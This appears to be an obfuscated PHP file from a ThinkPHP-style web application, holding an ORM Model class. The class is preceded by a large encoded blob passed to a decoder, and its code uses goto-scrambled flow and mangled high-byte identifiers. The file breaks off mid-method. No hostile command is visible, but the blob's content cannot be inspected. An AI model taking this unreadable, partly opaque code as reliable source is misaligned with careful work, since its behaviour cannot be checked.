330\311\353\54\245\237\172\276\263\355\5\233"."\xb3\xbc\xd6\xfa\xd6\xc6\xd6\xb0\x38\x60\xa6\x2e\x27\x12\xa0\xd9\x82\x1b\x2e\x4b\x5b\x7e\xcd\x9d\x1f\x91\x21\x9d\x9d\xd7\x81\x1f\x49\x44\xb4\xb0\x1b\xe4\x80\xee\x23\x7a\x23\x6c\x9d\x22"."\xff\xce\x79\x56\xea\x6c\x8\x27\x6b\x35\xc1\x35\x6f\x32\x59\xc1\xd1\xb8\xb8\x3a\xe0\x39\xcd\xdc\x42\x43\xe6\x16\x7b\x51\xa4\x8\x2\x79\x37\x24\xde\x50\x99\xbb\x41\x30\x3c\xe9\x6a\x2d"._kodDe('Lf8/lq5R9gbOBUVGjW/1/Hz2DVWBYjNEKXEBQstiQQJHBfu8BBbjijXhQ7cbIKA=')."\x8\x5b\x5b\x25\x9b\xa6\x20\x6d\xab\x42\xa3\x1\x77\x7a\xa9\xbb\xd4\xdd\x4b\x76\x7f\x55\x37\xfc\x22\x77\x67\x6c\xc7\xf8\x7d\x11\x80\xe4\xa8\xf4\x29\x22\xa2\x5a\x82\xc4\xc9\xa8\x8b\x29"."\xd\xac\x25\x14\x9\x37\xd6\x4e\xa2\x38\xd3\xd3\xb8\xc0\xc9\xfd\xfc\xcd\xa8\xea\x4b\x25\x25\xc2\xff\x54\x16\x4e\x74\x95\x14\x4a\xd4\x1b\x76\x65\x61\x4b\xb8\xce\x39\xb5\xb0\x6a\xe6\x90"."\x19\x35\x48\xc\x6f\x2a\x8d\x50\x8e\xe\x9d\x27\x62\x46\x74\x26\x11\x96\xcd\x80\x9b\x89\x45\xdc\xd6\xd8\x40\x65\x9\x4e\x4a\xc9\x4b\xb4\x34\x38\xd8\x0\x3e\x4a\xb9\x62\x64\x30\x5b\x18"."\316\342\256\27\323\212\331\253\351\344\216\201\240\323\322\22\246\301\314\61\115\312\40\173\14\33\274\127\100\71\31\355\176\113\246\77\233\166\102\166\330\31\22\275\316\330"."\x7c\xbc\x96\x58\xf3\x43\x86\xd6\x9a\x5f\x44\x84\x31\x8e\x22\x52\x3c\x88\x7d\xf2\x56\x48\xa2\xa3\x66\xc1\xb1\x9d\x13\x52\x0\x78\xe7\x51\xd9\xa\x81\x41\x1c\x49\x41\xaa\xe8\x26\x90\xae"."\x6b\x88\x0\x23\x56\x4\x78\x8e\xad\xbd\x70\xa8\x9d\x80\xaa\x82\xeb\x1f\x6c\x2a\x70\xd8\x9a\x4a\xbe\x2c\x56\x6f\xc0\x76\x1f\xc1\xf6\x51\x40\x45\xe0\xe4\x3a\x45\xe7\xc3\x7d\x80\xa4\x86".strrev('}XøN 3OÁ"¥o0~–lÎ:×DŸíÆ«%¥—ÉRÈÆ¦Şu7Â”S¯Î©mĞÉ')."\x16\xd2\x1b\xb0\xea\x4e\x46\x6d\xdb\xa9\x77\x41\x7e\x99\xeb\xff\x13\x6c\x5e\xa9\xb4\xac\x62\xd2\x34\xf0\x8f\xa0\x47\x7a\x2b\x95\xcd\x98\x95\x2c\x48\xfd\x83\x8e\x71\x27\x28\x1e\xe0\xae"."\x83\x69\xdf\xe0\x84\x5b\xbc\xa1\xa\x60\x3e\x8c\x6c\x87\x53\x4\x62\xc9\xc7\x5b\x6b\x71\x3c\x4d\x3a\x8a\x39\x49\xc1\x7\x2c\x12\xb4\xe2\x9d\x4\xaf\x69\x23\xcc\xa7\x6e\x1e\x4c\x1a\x57"."\x7a\xe8\x69\x49\xe\x4b\xe1\xf1\xb\x36\x21\xed\x34\xa0\xb3\xfc\x32\xdf\x22\xd1\x64\x17\xef\x49\x14\x2a\xbb\x91\x15\xde\x5\x1a\xaa\x71\xa2\xa\x1d\xab\x82\x54\x33\xd6\x91\x4d\x77\x55".strrev('ÙX°R@XvßÜ#'."\r".'\'ækà„@0UÎ9T?˜Î1Qœr÷NJRi©’‰'."\n".'')."\126\273\340\41\25\314\12\56\370\255\12\241\21\160\66\331\356\6\304\247\75\232\223\131\346\335\70\203\302\244\113\315\376\226\172\137\223\160\25\55\0\42\65\265\115\21"."\x4f\x73\x73\xde\x4\x46\xcf\x40\x59\x17\xbc\xb5\x71\x75\x52\x7\xfe\x31\xba\xc\x67\xa8\xa9\x76\x29\x6\xb5\x3b\x2b\xb\x20\xb4\x40\x32\xf4\x18\x75\x2f\x57\xe0\x26\x88\x17\x65\xe0\x1c".base64_decode('1QyVFCmERaQE6JMThXBy4cwZbnUmmx3uvEHXuPKqyz0W8ldueMubPhsuB/GmCQ==')."\101\353\270\253\6\111\232\41\113\170\340\53\13\341\25\134\242\120\352\0\7\70\323\143\231\151\57\334\104\57\66\146\270\145\61\21\156\305\240\106\251\143\306\143\365\60"."\11\163\136\321\271\47\146\163\113\134\43\247\347\344\26\201\225\273\142\142\22\236\111\244\136\233\233\337\215\144\3\156\316\116\132\174\50\131\57\26\230\54\76\317\12\161".base64_decode('sQcBMnKsC65HfniQBpCEZsjO4ASLg11TuFgDfQAfheyszh2GL12KK4L0wvLluQ==')."\x30\xa2\x9a\x63\x4f\xf2\x64\x54\x3b\x8\x2e\x23\x3b\xc\x72\xe4\x1c\x6\x4e\x41\xeb\x67\xf0\x12\x16\x33\x71\x8\xcd\xe3\x6f\xaa\xe7\x5\xf0\xbe\xe2\x71\x90\xb8\x90\x6a\xbd\xa1\x58\xeb"."\xc2\x42\xd7\xf8\xe5\xcb\xdd\x2a\xbd\xcb\x6e\x2d\xb0\x96\x75\xb1\xdc\x38\xde\xea\xb2\xe6\x7\x2d\x27\x43\xcd\x32\x12\x80\x3d\x27\xa6\x36\xcf\x25\x3b\x6f\x88\x7b\x3c\xd7\xa4\x67\x77\xd6".base64_decode('ErzIrqycuZDdRrTRNEoyqhOn0ule0uEMz2XBmiZOFLMVjpGJC0lPPFY3d1U9zA==').base64_decode('kTUeRTHsyWTEKPXnjuTkSTXqZlsdy85dMa5STrMgRGODwwtnWwJ8RgmBewDqBA==')."\64\132\247\35\16\352\142\100\26\230\141\304\164\65\143\132\220\24\176\270\246\0\271\36\357\224\173\144\234\245\100\242\17\141\24\40\177\253\5\0\51\341\24\202\15\170".base64_decode('U2ZA7CPpSrKyADXX6FAUUB7hl3wfAQULJIoaUzIbMd3UwDHJNKaJ0/+WINFX9Q==').base64_decode('NJHbCEKAjV2Ef88ayw4D+MpEUtGxUh5COeh+KsFFXOQNguZgIByooW7c88nCyg==')."\51\265\153\140\155\174\316\25\121\205\351\131\336\371\326\34\214\176\160\23\10\231\176\75\233\116\63\265\0\110\120\262\103\16\337\356\204\72\262\46\77\36\241\73\326\60"."\64\336\61\10\130\360\242\4\175\70\51\161\227\45\222\47\33\276\226\207\225\320\75\140\221\147\340\352\223\32\365\35\125\132\122\122\342\54\231\10\376\261\213\107\102\221".base64_decode('VVBrWCFLSUkF+ocTkBSWjKI1BWxail1Ihl6FGk8SPJ5S01lKNNVAXXUJtqyysg==').base64_decode('khIKtANgBJHBUQXd+tMFZm+6hK62SEyxDwO7MySTQo8HuNdpGFAvYILQsJAWMw==')."\xdb\x4\x90\x8d\x4f\x3d\x68\x87\x37\x1d\x27\x6c\xc9\x74\x6c\xfa\x51\x29\x7e\xcc\x45\x87\x57\x4\x8a\x77\x4f\x96\xaf\x82\x7c\xe0\x88\x8c\xb1\x6\x43\x80\x20\xc0\x40\x76\x56\x4c\xd9\x1f"."\305\222\314\372\16\106\233\130\126\354\301\31\277\220\106\172\233\147\365\164\150\275\21\176\262\301\350\271\54\206\72\17\331\27\272\144\130\67\311\10\120\234\107\227\10\275"."\233\46\127\335\310\336\254\113\115\132\54\200\42\102\335\242\373\341\351\60\43\155\73\300\63\220\342\245\223\211\205\354\344\153\220\366\161\361\165\200\274\47\242\307\160\260"."\202\114\305\20\141\44\165\215\133\350\344\274\34\105\143\202\335\32\25\70\207\376\213\256\5\205\170\51\0\153\47\324\60\357\121\102\5\366\44\133\31\117\134\170\324\310"."\xe0\x6e\xa3\x6a\x98\x87\x38\xd1\x97\x14\xbe\xcd\x15\xee\xfc\xd\xe2\xbb\x94\x5f\xdf\xd2\x3a\x7a\x4\xae\xc2\x95\xd1\xb5\x76\x30\xfe\x86\xd8\x57\x0\x6f\xce\xf\x66\xd9\x73\x73\xe6\xc9"."\304\72\44\346\23\201\120\315\210\276\257\103\226\22\267\374\221\371\313\137\102\326\20\43\363\5\240\125\345\107\110\250\141\256\336\105\40\344\122\304\13\173\244\111\144\255"."\x3\x72\x13\x56\x8\x6b\xd9\xaf\xac\x15\xca\xb6\x9a\xe4\x2d\x26\xc1\x6a\x8b\x64\xe3\x7a\x4f\x50\xa4\x20\x8a\x39\x55\x8d\xea\x2\xc0\xd1\xe0\xb7\x74\x56\x78\xce\x2a\x23\x5b\x81\xa2\x41".strrev(',†'."\n".'‚°¼Ds9]båPnö—nÎDGÂâJô™ç`¹¦®¼^i¬q¼')."\204\30\340\62\50\55\22\247\355\355\316\52\224\176\22\60\213\144\162\274\2\333\4\265\152\73\164\315\64\105\313\123\117\134\100\207\176\361\364\14\343\42\316\231\374\73"."\226\73\37\301\65\43\313\12\60\70\375\272\114\121\67\122\255\161\41\227\261\234\274\267\105\355\352\67\10\125\233\24\31\123\237\226\151\346\342\37\116\147\110\320\205\310"."\xf3\x5\x52\x88\x15\x21\x27\x88\xae\xc4\x34\x1d\x31\x7d\x82\xbd\x60\xda\xc\x2a\xed\x62\xd4\xaf\x31\x66\x17\xde\x31\x28\x79\xaa\x80\x76\xd2\xc2\xe2\x84\xab\x0\xb0\x61\x59\xd1\xea\x5a"."\160\211\11\142\202\3\123\341\130\167\116\224\30\75\20\301\65\343\310\4\41\1\345\317\107\32\330\144\64\202\32\44\342\62\103\331\50\23\207\333\216\153\252\144\51\211"."\x47\x26\x55\x95\x84\x15\x20\x4b\x5d\xd8\x3\x43\x4c\x3\xd5\x42\x27\x7c\xbc\x67\x62\x11\xf4\xcd\x9c\x22\x38\xd\x1e\x73\x5c\xa7\x52\x4c\x31\x0\x67\x2\x87\x6a\xe0\x94\x3c\x9f\x42\x49".strrev('Ñç’)uƒ»Ò'."\0".'Ë'."\n".'IH_#G$·TA&êN¥‰ÎV¡_¡$H>=1˜ÆˆÂ').base64_decode('hPeDkFUrNyVEBrxsPpGlL4vpwomjMFUqZPIqohV+8Ys1rGCGlnzpeIRgcq1FAQ==').strrev('Sü00ªƒØi'."\0".'.¸?x¥Eoú+jñ	VÁ§EÖ	¼²šmñ:kì–Í')."\45\104\206\227\70\70\254\61\140\356\45\270\213\51\141\22\3\24\362\136\117\121\61\64\100\261\110\23\32\373\231\41\1\230\311\56\170\76\62\115\70\103\214\320\124\266"."\x38\xd\x4b\x4\xeb\x91\x58\x4a\x33\x10\xcb\xd5\xab\x10\x5b\x12\xc6\x5\x37\x37\x34\xbb\x19\xa8\x9a\xe\x13\x33\x9\x25\x2c\x14\x7f\x1\x86\x68\x58\x11\x63\x8e\x5e\x30\xee\x1a\x75\x5b"."\x51\x53\xc1\x54\x6b\xe8\xfb\x92\xbd\x29\x35\x26\xf9\x3\xf5\xbe\x1a\x8f\xbf\xd6\x17\x9a\x25\x41\xeb\x7f\x7e\xbd\x8f\xb4\xa9\xad\xdb\x1d\x49\x85\xf0\xe4\xd0\x95\x1f\x65\x2e\x7b\x61\xd0".strrev('7%tg2í.IÜWY@Ê€„VS© #SŠ£^-ZŞ¸àÆ‚ÁSƒchÎ3¡d').strrev('ZaætóK¬_¢Z#•'."\r".'Qîš¼j¤­aÁ¹¬E°ÿÏä†´ód'."\n".'-ä‰‚¿')."\30\364\270\350\104\232\17\66\376\112\256\53\12\342\144\100\364\230\152\143\120\361\64\211\76\113\62\124\230\115\36\76\341\356\275\121\124\160\274\236\321\145\325\120\4\0".base64_decode('9gA+vpjGBEcmpHQEl8GwIHw08X9duRrnvgxsTVPj9Aqcqcxjb7s14tsttAk53g==')."\341\377\253\237\171\7\27\207\107\220\355\71\125\127\104\57\307\222\313\11\166\361\33\301\157\146\363\117\0\266\111\357\317\210\27\50\356\70\365\377\115\271\66\350\106\305"."\113\145\241\60\302\351\123\230\235\324\6\77\207\71\24\300\57\301\233\4\112\311\122\301\4\330\320\144\330\55\27\210\66\217\371\166\215\71\313\113\211\71\337\200\72\114"."\x3\xd7\x3\xca\x49\x9c\x67\x67\x19\xa4\x4a\xa9\x4\x9\x83\xf8\x23\xa\xd2\xc\x6a\xbd\xc3\x3f\x81\x5c\x27\x78\x53\x19\xd3\xc2\x84\x11\xc5\x59\x9e\xd9\xf2\xc2\x25\xa2\x3e\x38\xe7\x2"."\xf5\x31\xb4\x54\x7f\xe\xc0\xc2\xdf\xfb\x69\xbb\x98\xce\x16\xf4\xdc\x9c\x4e\x68\xe2\x30\x20\x4\x8\xce\x11\xfc\x1a\x8\xd4\x5c\xc6\x21\xcc\xf6\x39\x0\x21\xae\x98\xb9\x6e\xe3\x71\x3d".base64_decode('A1Zq2I8QTs4ApBDq0HqtD3xAiEC8WJCy9VswRVjMyIZTsIihv9AzgMVfv1D7OA==').base64_decode('/NNKfimWt1eN9zVpSjGb+xrLy80CoFHhnBgqBS/H5TRDW8RhPnvIg28vmiYsKQ==').strrev('¿uXñ>Ó»rÂÖPôMeHRªc»5§Õ\'çGû›ÈêÉ`mE'."\0".'íDdô')."\265\3\121\247\101\42\225\211\304\331\12\230\51\144\240\157\156\304\35\350\101\10\214\207\354\217\216\10\373\207\41\67\261\164\173\122\213\312\311\40\326\261\261\50\255\353".strrev('@Ï|fµğvH@íÀí|LıD‹à]P,¤M‡ÚløÂÁ„ğ™3–äl–tao€').strrev('£×p\\(6[øÍ ÉŒ‰s³¹²‚7’ˆPCw¹İ÷„êœäĞzïIV-º').base64_decode('ANr1IqH7K1C2Dq3P0uAFi35qlQSj+mGc84SijSi/UbY/hUE/w971cOCe8UeJ8A==').base64_decode('Kx4O9mKHA3vCcZB3OhzcnufXXrbhz4BZ3w6DbWbaZTnkt53yZkNlKxC0D1xYyw==')."\225\244\361\33\261\164\66\305\57\34\101\304\312\211\344\164\130\350\141\126\117\72\320\175\240\203\272\104\261\15\7\357\225\70\63\171\306\360\277\327\201\225\14\21\173\21"."\267\142\235\212\31\121\235\336\261\330\263\251\226\125\7\230\172\256\345\216\375\62\345\274\22\60\77\25\57\55\233\64\115\144\343\371\374\360\273\13\352\375\17\377\220\13"."\24\162\242\363\211\227\254\313\112\242\76\241\304\355\213\22\255\152\240\271\357\352\10\113\324\212\222\377\167\133\201\23\305\70\253\240\236\231\373\334\126\316\220\240\125\51".strrev('Ÿ+eÔÓp ¦^ÈIh·/ÀÖøˆ8Côò WáoÖ:»øÂ>,oÂƒYæíš2¨')."\224\217\35\100\43\101\171\17\25\75\165\247\330\333\216\6\206\10\22\170\262\300\57\210\65\232\232\135\12\2\213\303\203\12\11\341\2\151\352\263\24\32\56\362\115\366"."\x7f\x37\x81\x94\x25\xc0\xdc\x3\x57\x42\xc8\xd3\x73\xf7\x39\x14\x91\xd8\x9e\xbc\xb1\xbd\x59\xf6\x2b\xed\xc6\x44\x17\x63\x7f\x9c\x32\x7d\x46\x7\x4d\xaa\x20\x39\x53\xcc\x0\x9a\x60\x42"."\xbd\x70\x6e\xcc\xda\x57\x5b\xf5\xa0\x18\xaf\xa3\xcd\x21\xd\x94\x29\x97\xa\x13\x9e\xf8\xe1\xfe\x1d\x4\x92\xb\x96\xa6\xf6\x52\x3\x30\xb3\x14\x5b\xf1\xd7\x4b\x90\xc5\xb\x17\x46\xa3"."\xbd\x6a\xd9\xb7\x82\xcf\x35\xd1\x80\x4\x55\x24\x6e\x83\xdc\xaa\x91\x7c\x84\xb4\x97\x6c\x5c\xf4\xe8\x3c\x52\xd6\xf0\xd4\x33\xbb\x21\x59\xd0\x11\x81\x43\x27\x3c\x5b\xa5\x89\x61\xab\x19".base64_decode('boB6yQJEkoXRAvFa28tmCPnYnzuj/Uf7nOM0wQDNwg6wZz4s7IFhf+8GkFOiqw==').base64_decode('ORBlK5wcngTrIX1d/DWH/bG7jGBxa3uAUxBVWp/W7BCbBT0R2LY1tfeD5pP4/g==')."\204\40\176\344\203\14\207\51\45\376\377\374\370\335\377\257\67\357\46\225\120\241\262\345\141\264\172\102\340\122\152\154\211\340\150\20\13\64\155\375\260\36\221\203\305\124"."\xb2\x42\x1d\x96\x18\x89\xf0\xd\x7\xcf\x1e\x97\xed\x95\x51\x17\x53\x60\xa4\x9e\x2b\xa8\x43\xb\x99\x5e\x98\xc8\xf0\xc5\x9f\x1c\x1\x25\x7d\x29\xb\xac\xc8\x2e\xf6\x90\x53\xbe\x48\xee"."\xfb\x85\x96\xc5\x47\xe9\x4d\xde\xcc\xb4\x1a\xeb\xca\x73\x1\x7\xa7\xc0\x6f\x75\xcb\x27\x50\x9\x39\xd9\x38\x7e\x2\xc4\x4\xf5\xd5\xe1\xa6\xa1\x18\x64\xb3\x20\x29\x49\xd1\xa2\x68\x5e".strrev('Láïm%$ŸYtıÃÃŠh)Ëa7ÁÊÃ˜ˆ‹ª&@ú(s¶â`˜¬†PÈ')."\206\70\266\26\151\162\356\175\154\156\151\266\231\305\42\120\241\323\52\223\141\157\35\226\330\37\77\234\350\314\375\30\326\247\206\362\204\40\344\370\351\202\104\27\16\350"."\x42\x30\x4f\x19\xbc\x2d\x43\x3c\xcf\x0\xcb\x3f\xff\x26\x64\x2f\x55\xa\x8c\x30\x8\x89\xfd\xa5\x9b\xb9\x59\xd7\x10\x29\x66\x85\x32\xa9\x86\xa0\xd\x27\x3c\xbc\x97\xf3\x26\x98\x4d\x70"."\17\330\43\176\223\245\152\310\355\46\351\166\250\245\261\10\231\4\220\225\12\250\173\341\125\135\63\225\301\322\56\361\14\245\226\67\202\52\53\1\131\144\122\206\350\114"."\330\132\22\52\47\133\167\312\314\174\331\142\232\156\10\331\30\74\137\136\370\354\232\151\31\115\356\13\325\356\3\25\261\302\230\273\265\60\271\344\332\120\4\11\267\152"."\x80\xbc\x8d\x5b\x3d\x1b\xa3\x44\x4\xa6\xfe\x9f\xe8\x23\xcb\xfc\x5e\xc8\x7a\x2d\xc7\x1c\x4f\xe6\x60\xaa\xac\xea\x17\x92\x51\x29\xea\x41\x4\xfc\x42\xb\x24\x1f\x37\xc9\x46\xc9\x58\x9a"."\355\351\221\115\172\271\145\57\325\142\341\45\204\113\274\30\132\73\336\334\173\32\176\175\44\34\376\264\30\144\106\70\256\265\301\5\344\317\261\235\334\303\257\146\70\365"."\x1b\x8f\xb3\x27\x34\x2d\x59\xe3\x94\xfe\x67\x50\x0\xe1\xaf\x6d\x42\x5a\x47\x30\x6a\xe4\xca\xb0\x4a\xaf\xfd\x71\x37\x97\x68\x8\x69\xc9\x98\xb\xe5\x46\x8f\x42\x79\x2e\xa5\xe7\xdd\x84"."\xb0\x7c\xdd\x47\x5b\xc6\x5a\x5c\x34\xaa\x64\x8b\x8a\x83\xb0\x5b\x5c\xa6\x98\x22\x70\x1a\x50\xb\x9c\x6b\xac\xe0\xae\x30\x3e\x9a\x7f\xd2\x6a\xc2\xc9\xb2\xb1\x39\x3\x79\x90\xce\xbd\xd3"."\x2\xb5\xf1\x4e\x50\x2a\x41\x8f\x71\x5b\x92\x21\xbe\xe\x6a\xbd\x9b\x13\x19\x7b\x61\x9\x28\x49\xbf\x50\x9d\x78\x6f\x37\x60\x81\x50\xfe\x8f\xf0\x55\x69\x1d\x62\xc1\xdc\x95\x27\xd0\xc3".strrev(':Æj¯FáöÅë[ù¹ÉEÓà¦/—ÏÙj}ih˜ ÎHÇXì€¾³J').base64_decode('BF4kNzEXrucMKvlQ/vbaW0XH1M6h8Upy2iNc/oe1PGVwi/IWw0noDWtGQ1rKDg==')."\x30\x4\xb0\x2c\x4e\x82\x65\x73\x92\x69\x61\x41\xb4\x21\x94\x33\xe5\xac\x31\x40\xf7\x72\x7\x8f\x70\xf9\xf1\x3c\x1d\xb6\xf1\xc2\x38\xeb\x40\xe3\x99\x37\x73\xee\xe7\xc8\x8a\xb3\xe7\x46"."\142\201\374\255\340\334\274\355\202\65\137\53\362\146\36\260\25\171\336\345\45\316\264\362\340\132\232\222\7\273\362\333\370\134\74\316\323\362\350\6\340\72\341\31\55\172"."\151\311\223\54\52\32\344\127\105\10\346\335\372\206\125\107\300\6\27\7\206\352\13\1\216\215\77\130\53\150\260\216\263\240\364\154\272\53\255\261\143\42\316\265\272\240"."\x6\x27\x7b\xd6\x95\x7d\x2e\xa7\x36\xeb\xd2\x4c\x67\x5\x6d\xcc\xbc\xa\xb5\xe\xf4\xda\x77\xe\x27\x9b\x94\xa9\xa4\x5c\xd0\x45\xc6\x5c\x8b\x66\xaa\x31\x41\x4f\xc9\xfe\xbe\x39\x4e\xa7"."\x1f\x49\xa\x2\x38\x9b\xec\x8b\x73\xfb\x96\xfb\xe9\x3c\xd2\x21\x4\x22\xe4\x1a\x17\x3a\x47\xe4\x84\x45\x19\xd1\xa2\xa9\x8d\xe9\x1\x22\x7d\xc7\x97\x70\x35\xf0\xe\x96\x5d\xbc\x40\x76"."\xcb\x81\xcf\x4f\x9c\xc\x1f\x60\x77\xc0\xb4\xb0\x96\x41\xbf\xd5\x9a\x69\x52\xcc\xa2\xc6\x31\x4f\x8d\x88\x3e\x78\x8\x3a\x4\x9d\x5\x10\xe2\xb7\x2c\x70\x54\x91\xe0\x1f\x2d\x4f\x84\x46"."\x50\x90\x5c\x7\x42\x6\x34\xa4\xe0\x54\x84\x7c\x2c\x11\x78\xa1\xc0\x22\xe2\x19\x47\xee\xf0\xea\xb2\xb6\x8b\x48\xe\x0\x4c\x65\x54\xeb\xa3\x2e\xd2\xa0\xbd\x28\x6f\xf\x7f\x1d\x56\xb6".base64_decode('E3acJiHrT9TAQFa5hhunuIn3WSeqw0lckXRm2i3FsZN7pnn4azUQWSWvAnulRA==').strrev('_•“ŸÏFŞi@Ó@†æ¤œ—e¥FIÌ±;°@ÜĞ¡=š’r‡'."\n".'Ï;ÕŸè&b')."\232\42\334\243\16\116\362\65\243\126\172\374\376\300\334\201\132\341\253\231\305\133\202\256\132\271\60\74\323\241\121\311\66\275\63\10\311\111\312\133\13\226\143\112\212\273".base64_decode('VuJlrCIDcV4N6meMBayu3m16aHTBkoqg4koTqTuYIVDo1JNtdkY8ow5pNmV5fA==')."\231\354\262\334\100\13\160\264\131\20\312\21\26\241\170\332\42\300\370\274\43\46\312\123\163\345\373\50\225\217\10\154\351\271\32\121\225\352\324\242\202\374\36\363\62\304"."\202\213\214\261\240\255\204\303\44\371\377\0\246\376\261\233\245\235\0\0"."".base64_decode('').""."", 10, -8))); goto e¸éáÇËñ; c›Ó©¬¼·È: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\162\x64\x65\x72", "\x61\154\x69\x61\163", "\150\x61\x76\x69\156\x67", "\147\162\x6f\x75\160", "\154\x6f\x63\x6b", "\144\x69\163\x74\151\x6e\x63\164", "\141\x75\x74\x6f", "\x66\151\154\x74\x65\x72", "\x76\x61\154\151\x64\x61\164\x65", "\162\x65\163\165\x6c\x74", "\142\151\x6e\x64", "\x74\157\x6b\145\156"); public function __construct($eÃ•¬’Àà = '', $A©¤î™ô¡· = '', $d£è÷Ø×å = '') { $AìÕ¹÷Äáà =& $_SERVER[£¶ä½¶¢]; $this->_initialize(); if (!empty($eÃ•¬’Àà)) { if (strpos($eÃ•¬’Àà, $AìÕ¹÷Äáà[105])) { list($this->dbName, $this->name) = explode($AìÕ¹÷Äáà[105], $eÃ•¬’Àà); } else { $this->name = $eÃ•¬’Àà; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($A©¤î™ô¡·)) { $this->tablePrefix = $AìÕ¹÷Äáà[43]; } elseif ($AìÕ¹÷Äáà[43] != $A©¤î™ô¡·) { $this->tablePrefix = $A©¤î™ô¡·; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AìÕ¹÷Äáà[251]); } $this->db(0, empty($this->connection) ? $d£è÷Ø×å : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e¡…°ÈÙ¤ó =& $_SERVER[£¶ä½¶¢]; if (empty($this->fields)) { if (think_config($e¡…°ÈÙ¤ó[252])) { $A¦ƒÆ² = $this->dbName ? $this->dbName : think_config($e¡…°ÈÙ¤ó[253]); $c•¦ŠÜ¨‡ = think_var_cache($e¡…°ÈÙ¤ó[254] . strtolower(get_path_this($A¦ƒÆ²) . $e¡…°ÈÙ¤ó[105] . $this->name)); if ($c•¦ŠÜ¨‡) { $AÀº‹ÃŠš = think_config($e¡…°ÈÙ¤ó[255]); if (empty($AÀº‹ÃŠš) || $c•¦ŠÜ¨‡[$e¡…°ÈÙ¤ó[256]] == $AÀº‹ÃŠš) { $this->fields = $c•¦ŠÜ¨‡; return; } } } $this->flush(); } } public function flush() { goto F“™Éç¹ÉÆ; d££×±•ÕÔ: if (!$D„õŒÌˆ) { return !1; } $this->fields = array_keys($D„õŒÌˆ); $this->fields[$BÑ¨¥ïÁŞ‘[257]] = !1; goto CÎ©µÀ³­Ÿ; CÎ©µÀ³­Ÿ: foreach ($D„õŒÌˆ as $E‚àò… => $DŒ¾‚õËç¾) { $f‡Ï­Ñ‡Ú›[$E‚àò…] = $DŒ¾‚õËç¾[$BÑ¨¥ïÁŞ‘[39]]; if ($DŒ¾‚õËç¾[$BÑ¨¥ïÁŞ‘[46]]) { $this->fields[$BÑ¨¥ïÁŞ‘[258]] = $E‚àò…; if ($DŒ¾‚õËç¾[$BÑ¨¥ïÁŞ‘[49]]) { $this->fields[$BÑ¨¥ïÁŞ‘[257]] = !0; } } } $this->fields[$BÑ¨¥ïÁŞ‘[259]] = $f‡Ï­Ñ‡Ú›; if (think_config($BÑ¨¥ïÁŞ‘[255])) { $this->fields[$BÑ¨¥ïÁŞ‘[256]] = think_config($BÑ¨¥ïÁŞ‘[255]); } goto AÚ®Çõô; AÚ®Çõô: if (think_config($BÑ¨¥ïÁŞ‘[252])) { $f‘‚º¤Øˆ§ = $this->dbName ? $this->dbName : think_config($BÑ¨¥ïÁŞ‘[253]); think_var_cache($BÑ¨¥ïÁŞ‘[254] . strtolower(get_path_this($f‘‚º¤Øˆ§) . $BÑ¨¥ïÁŞ‘[105] . $this->name), $this->fields); } goto DÈà…ºÓë; F“™Éç¹ÉÆ: $BÑ¨¥ïÁŞ‘ =& $_SERVER[£¶ä½¶¢]; $this->db->setModel($this->name); $D„õŒÌˆ = $this->db->getFields($this->getTableName()); goto d££×±•ÕÔ; DÈà…ºÓë: } public function switchModel($c»÷™Ò¤½è, $bÃÛÛ§Š«õ = array()) { $aö‰Ü¼ë¤¢ =& $_SERVER[£¶ä½¶¢]; $e¡×’¿ƒÄ = ucwords(strtolower($c»÷™Ò¤½è)) . $aö‰Ü¼ë¤¢[260]; if (!class_exists($e¡×’¿ƒÄ)) { think_exception($e¡×’¿ƒÄ . think_lang($aö‰Ü¼ë¤¢[261])); } $this->_extModel = new $e¡×’¿ƒÄ($this->name); if (!empty($bÃÛÛ§Š«õ)) { foreach ($bÃÛÛ§Š«õ as $B•‚´ªã¤İ) { $this->_extModel->setProperty($B•‚´ªã¤İ, $this->{$B•‚´ªã¤İ}); } } return $this->_extModel; } public function __set($D¾Çµ†»ß–, $Bß©®£ò³«) { $this->data[$D¾Çµ†»ß–] = $Bß©®£ò³«; } public function __get($Fè¡ØïÃÉÅ) { return isset($this->data[$Fè¡ØïÃÉÅ]) ? $this->data[$Fè¡ØïÃÉÅ] : null; } public function __isset($B°¬ÈÚé¡¦) { return isset($this->data[$B°¬ÈÚé¡¦]); } public function __unset($EÑ¶Æ‘Íø») { unset($this->data[$EÑ¶Æ‘Íø»]); } public function __call($eÌàƒ ª÷, $dîªÍ…œœå) { $Dùœß—–®“ =& $_SERVER[£¶ä½¶¢]; if (in_array(strtolower($eÌàƒ ª÷), $this->methods, !0)) { $this->options[strtolower($eÌàƒ ª÷)] = $dîªÍ…œœå[0]; return $this; } elseif (in_array(strtolower($eÌàƒ ª÷), array($Dùœß—–®“[262], $Dùœß—–®“[263], $Dùœß—–®“[264], $Dùœß—–®“[265], $Dùœß—–®“[266]), !0)) { $bÂÂ·’Ø¤ = isset($dîªÍ…œœå[0]) ? $dîªÍ…œœå[0] : $Dùœß—–®“[192]; $bÂÂ·’Ø¤ = $this->db->parseKey($bÂÂ·’Ø¤); return $this->getField(strtoupper($eÌàƒ ª÷) . $Dùœß—–®“[267] . $bÂÂ·’Ø¤ . $Dùœß—–®“[268] . $eÌàƒ ª÷, $Dùœß—–®“[262]); } elseif (strtolower(substr($eÌàƒ ª÷, 0, 5)) == $Dùœß—–®“[269]) { $bÂÂ·’Ø¤ = think_parse_name(substr($eÌàƒ ª÷, 5)); $D†ºØ­¤çÓ[$bÂÂ·’Ø¤] = $dîªÍ…œœå[0]; return $this->where($D†ºØ­¤çÓ)->find(); } elseif (strtolower(substr($eÌàƒ ª÷, 0, 10)) == $Dùœß—–®“[270]) { $eˆôÖ¥„»î = think_parse_name(substr($eÌàƒ ª÷, 10)); $D†ºØ­¤çÓ[$eˆôÖ¥„»î] = $dîªÍ…œœå[0]; return $this->where($D†ºØ­¤çÓ)->getField($dîªÍ…œœå[1]); } elseif (isset($this->_scope[$eÌàƒ ª÷])) { return $this->scope($eÌàƒ ª÷, $dîªÍ…œœå[0]); } elseif (method_exists($this, 